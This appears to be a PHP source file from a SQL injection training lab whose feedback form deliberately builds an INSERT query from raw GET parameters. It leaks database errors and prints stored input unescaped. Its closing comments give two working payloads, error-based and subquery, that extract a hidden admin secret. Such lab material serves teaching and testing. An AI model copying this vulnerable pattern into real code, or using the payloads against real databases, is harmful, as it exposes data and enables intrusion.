<?php
/*
 * SQLi-Arena. MySQL Lab 14: INSERT / UPDATE Injection
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input from query string / form
$name    = $_GET['fb_name'];
$comment = $_GET['fb_comment'];
$rating  = $_GET['fb_rating'];

// VULNERABLE: User input directly concatenated into INSERT statement.
// The name, comment, and rating fields are all injectable.
// Unlike SELECT-based injection, the attacker is inside an INSERT ... VALUES() context.
$query = "INSERT INTO feedback (name, comment, rating) VALUES ('$name', '$comment', '$rating')";

$result = mysqli_query($conn, $query);

if ($result) {
    echo "Thank you for your feedback!";
} else {
    echo "Error: " . mysqli_error($conn);
}

// Display recent feedback
$recent = mysqli_query($conn, "SELECT name, comment, rating, created_at FROM feedback ORDER BY id DESC LIMIT 10");
while ($row = mysqli_fetch_assoc($recent)) {
    echo $row['name'] . " | " . $row['comment'] . " | " . $row['rating'] . "\n";
}

// Hidden table structure:
// CREATE TABLE admin_panel (id INT, admin_secret VARCHAR(100));
//
// Attack vectors:
// 1. Error-based in name field:
//    name = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT admin_secret FROM admin_panel LIMIT 1))) AND '
//    This triggers an XPATH error that leaks the admin_secret value.
//
// 2. Subquery injection in name field:
//    name = test', (SELECT admin_secret FROM admin_panel LIMIT 1), 5) -- -
//    This closes the VALUES clause early and injects the flag into the comment column.
